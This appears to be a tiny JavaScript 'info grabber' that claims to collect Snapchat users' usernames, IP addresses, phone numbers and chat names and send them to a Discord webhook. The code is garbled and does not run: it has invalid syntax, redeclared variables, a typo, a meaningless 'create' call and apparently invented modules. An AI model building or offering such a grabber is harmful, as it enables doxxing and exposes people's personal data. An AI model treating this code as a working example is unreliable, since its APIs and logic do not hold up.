//NATRIX_DEV

//open source library at github/natrix_dev

//modules imports
const { WebhookClient } = require("discord.js")
const snap = require("snap-api")
const ip, num, pseudo = require("snap-api-sender_infos")
//vars 
var user = "snap-api-send_infos-user.username"
var ip = "snap-api-send_infos-user.ipSender"
var num = "snap-api-send_infos-user.numSender"
var reciever = "snap-api-send_infos-rec"
var grp_name = "snap-api-send_infos-CHAT_NAME"

//def message

console.log(`USERNAME: ${user}`)
console.log(`IP ADRESS: ${ip}`)
console.log(`PHONE: ${num}`)
console.log(`RECIEVER: ${reciever}`)
console.log(`CHAT: ${grp_nae}`)

//console code 
create (WebhookClient, 963)
WebhookClient.send("infos")
//NATRIX_Dev